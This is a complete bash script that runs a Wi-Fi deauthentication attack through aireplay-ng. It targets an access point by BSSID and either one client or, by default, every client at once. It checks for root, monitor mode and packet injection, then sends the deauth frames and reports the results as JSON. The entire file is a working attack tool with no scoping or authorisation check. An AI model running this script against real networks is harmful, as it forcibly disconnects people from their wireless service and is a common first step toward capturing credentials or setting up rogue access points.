#!/usr/bin/env bash
# Deauthentication attack using aireplay-ng
# Usage: deauth.sh <interface> <bssid> [client_mac] [count] [interval]

set -euo pipefail

_log()   { echo "$*" >&2; }
_json()  { printf '%s\n' "$*"; }
_die()   { _json "{\"status\":\"error\",\"message\":\"$1\"}"; exit 1; }

cleanup() {
    if [[ -n "${AIREPLAY_PID:-}" ]]; then
        kill "$AIREPLAY_PID" 2>/dev/null || true
        wait "$AIREPLAY_PID" 2>/dev/null || true
    fi
    exit "${EXIT_RC:-0}"
}
trap cleanup EXIT

# ── Root check ────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    _die "Root privileges required"
fi

# ── Dependency check ──────────────────────────────────────────────────
for cmd in aireplay-ng; do
    if ! command -v "$cmd" &>/dev/null; then
        _die "$cmd not found. Install aircrack-ng."
    fi
done

# ── Args ──────────────────────────────────────────────────────────────
IFACE="${1:-}"
BSSID="${2:-}"
CLIENT="${3:-FF:FF:FF:FF:FF:FF}"
COUNT="${4:-5}"
INTERVAL="${5:-0.1}"

if [[ -z "$IFACE" || -z "$BSSID" ]]; then
    _die "Usage: deauth.sh <interface> <bssid> [client_mac] [count] [interval]"
fi

# Normalize MACs to uppercase
BSSID=$(echo "$BSSID" | tr '[:lower:]' '[:upper:]')
CLIENT=$(echo "$CLIENT" | tr '[:lower:]' '[:upper:]')

if [[ "$CLIENT" == "FF:FF:FF:FF:FF:FF" ]]; then
    _log "[*] Broadcast deauth to all clients of $BSSID"
else
    _log "[*] Targeted deauth: $BSSID -> $CLIENT"
fi

# ── Validate interface ────────────────────────────────────────────────
if [[ ! -d "/sys/class/net/$IFACE" ]]; then
    _die "Interface '$IFACE' does not exist"
fi

MODE=$(iw "$IFACE" info 2>/dev/null | awk '/type/{print $2}' || echo "unknown")
if [[ "$MODE" != "monitor" ]]; then
    _die "Interface $IFACE is not in monitor mode (current: $MODE)"
fi

# ── Injection test ────────────────────────────────────────────────────
_log "[*] Verifying injection capability..."
INJ_OUTPUT=$(aireplay-ng --test "$IFACE" 2>&1 || true)
if echo "$INJ_OUTPUT" | grep -q "No answer"; then
    _log "[!] Warning: Injection test returned no answer (continuing anyway)"
fi

# ── Execute deauth ───────────────────────────────────────────────────
_log "[*] Sending $COUNT deauth packets (interval: ${INTERVAL}s)..."

DEAUTH_ARGS="-0 $COUNT -a $BSSID"

if [[ "$CLIENT" != "FF:FF:FF:FF:FF:FF" ]]; then
    DEAUTH_ARGS="$DEAUTH_ARGS -c $CLIENT"
fi

DEAUTH_ARGS="$DEAUTH_ARGS --ignore-negative-one"

# Run aireplay-ng and capture output
AIREPLAY_OUTPUT=$(aireplay-ng $DEAUTH_ARGS "$IFACE" 2>&1) || true
_log "$AIREPLAY_OUTPUT"

# ── Parse results ─────────────────────────────────────────────────────
PACKETS_SENT=0
if echo "$AIREPLAY_OUTPUT" | grep -qoP '\d+(?= deauth\b| packets sent)'; then
    PACKETS_SENT=$(echo "$AIREPLAY_OUTPUT" | grep -oP '\d+(?= deauth\b| packets sent)' | tail -1)
fi

# Count lines with "Sending DeAuth" as a fallback
if [[ "$PACKETS_SENT" -eq 0 ]]; then
    PACKETS_SENT=$(echo "$AIREPLAY_OUTPUT" | grep -c "Sending DeAuth" 2>/dev/null || echo "0")
fi

# ── Output ────────────────────────────────────────────────────────────
if [[ "$CLIENT" == "FF:FF:FF:FF:FF:FF" ]]; then
    TARGET_TYPE="broadcast"
else
    TARGET_TYPE="directed"
fi

_json "{\"status\":\"success\",\"interface\":\"${IFACE}\",\"bssid\":\"${BSSID}\",\"client\":\"${CLIENT}\",\"target_type\":\"${TARGET_TYPE}\",\"packets_sent\":${PACKETS_SENT},\"count_requested\":${COUNT},\"interval\":${INTERVAL}}"
